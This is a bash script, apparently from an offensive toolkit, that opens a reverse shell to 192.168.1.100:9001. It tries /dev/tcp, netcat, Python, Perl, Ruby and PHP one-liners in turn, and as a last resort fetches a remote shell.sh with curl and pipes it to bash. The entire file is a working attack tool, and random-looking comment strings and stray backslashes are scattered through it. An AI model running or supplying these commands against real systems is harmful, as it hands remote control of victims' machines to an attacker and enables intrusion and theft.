#!/bin/bash # DstAVqDAkDgp
# G3r4ki Advanced Bash Reverse Shell
# Attempts multiple methods for reverse shell connection

# TCP Socket method
if [[ -e /dev/tcp && -w /dev/tcp ]]; then \
      
    bash -i >& /dev/tcp/192.168.1.100/9001 0>&1
    exit 0
fi # VxVsvCJGqwiGHzkxsNXK

# Netcat method # okLdYMNDzTyBxTi
if command -v nc >/dev/null 2>&1; then # onYEhLNnuGMiu \
        
    nc -e /bin/bash 192.168.1.100 9001 || nc -c /bin/bash 192.168.1.100 9001 || nc 192.168.1.100 9001 -e /bin/bash # VRFVeQVusenKdFNxiVAL \
    
    exit 0 \
  
fi

# Python method
if command -v python >/dev/null 2>&1; then \
       
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);' # zgfcn
    exit 0
fi \
   

# Perl method
if command -v perl >/dev/null 2>&1; then # AAhCgLnEWLywvnb
    perl -e 'use Socket;$i="192.168.1.100";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
    exit 0 \
    
fi \
   

# Ruby method
if command -v ruby >/dev/null 2>&1; then
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.1.100",9001);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    exit 0 # eomlxFDX \
  
fi # FjWGHpk \
     

# PHP method
if command -v php >/dev/null 2>&1; then \
        
    php -r '$sock=fsockopen("192.168.1.100",9001);exec("/bin/bash -i <&3 >&3 2>&3");' # FnQbBAcRhYoAjeJaF
    exit 0 # KGBgs
fi

# Last resort: curl pipe to bash
if command -v curl >/dev/null 2>&1; then # nTPymtNEweHbscHukvl
    # This assumes you have a reverse shell script hosted at http://192.168.1.100:8080/shell.sh
    curl -s http://192.168.1.100:8080/shell.sh | bash # AbmXUXPSqQnnWR
    exit 0
fi # MrvGMaFoOnvXqqpAOQZq